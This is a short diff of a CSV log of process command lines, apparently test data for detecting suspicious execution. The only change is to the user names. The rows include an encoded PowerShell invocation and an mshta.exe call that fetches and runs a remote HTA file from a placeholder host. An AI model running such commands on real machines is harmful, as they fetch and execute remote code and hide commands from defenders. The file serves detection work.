@@ -1,4 +1,4 @@
 timestamp,computer,user,command_line
-2026-11-19 12:00:00,PC-01,Admin,powershell.exe -enc SQBFAFgA
-2026-11-19 12:05:00,PC-02,Alice,notepad.exe
-2026-11-19 12:10:00,PC-03,Bob,mshta.exe https://example.com/a.hta
+2026-11-19 12:00:00,PC-01,Pedro,powershell.exe -enc SQBFAFgA
+2026-11-19 12:05:00,PC-02,Admin,notepad.exe
+2026-11-19 12:10:00,PC-03,userX,mshta.exe https://example.com/a.hta
